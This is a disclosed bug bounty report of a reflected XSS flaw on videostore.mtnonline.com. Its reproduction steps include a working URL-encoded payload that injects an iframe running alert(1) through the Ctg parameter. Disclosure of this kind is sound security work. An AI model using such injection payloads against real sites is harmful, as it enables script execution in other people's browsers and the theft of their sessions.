# Reflected xss on videostore.mtnonline.com

## Report Details
- **Report ID**: 1646248
- **URL**: https://hackerone.com/reports/1646248
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-07-22T11:03:04.189Z
- **Disclosed**: 2022-09-25T19:10:11.387Z

## Reporter
- **Username**: possowski
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
Hi,
I found reflected xss vuln on videostore.mtnonline.com

## Steps To Reproduce:
  1. Open browser
  2. Go to ``https://videostore.mtnonline.com/GL/Default.aspx?PId=126&CId=5&OprId=11&Ctg=OF25MTNNGVS_LapsInTime%22%27testxxx%3E%3Ciframe%20src=%22data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E%22%3E%3C/iframe%3E`` url
 3. Browser show alert popup

## Impact

We can run javascript code

## Attachments
No attachments
